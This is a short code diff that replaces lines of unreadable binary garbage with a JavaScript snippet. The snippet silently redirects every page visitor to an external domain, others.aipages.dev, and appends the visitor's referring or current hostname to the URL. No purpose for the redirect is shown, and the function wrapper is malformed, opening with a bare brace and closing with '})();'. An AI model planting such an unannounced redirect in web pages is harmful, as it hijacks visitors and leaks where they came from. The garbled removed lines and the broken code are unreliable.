@@ -1,3 +1,18 @@
-{�z�k��������֫��\���z�b�X�z�����LF8m��?�׬���j�u���񞶷�z��h��ky��v�.�����ޮ��}�em�$��.����,�v�y��rب�,���z۫�w�Q-���q�\��޶�罪�y�h�ӟv�.�����ޮ�����*'��-�����螋kyثy�p��ږ��w*'��j�
-�ȭy���h����׬���j�u���׬�Z
-jب�,�v�z������:'���v*�r�p�Ǣ�v�#�j]�w�z۫��v�#�j]�w
+{
+  'use strict';
+
+  var TARGET = 'https://others.aipages.dev/';
+
+  function hostOf(u) {
+    try { return new URL(u).hostname || ''; } catch (e) { return ''; }
+  }
+
+  var ref = hostOf(document.referrer) || location.hostname || '';
+
+  if (/^others\.aipages\.dev$/i.test(location.hostname)) return;
+
+  if (window.__jump_done__) return;
+  window.__jump_done__ = true;
+
+  location.replace(TARGET + '?' + encodeURIComponent(ref));
+})();
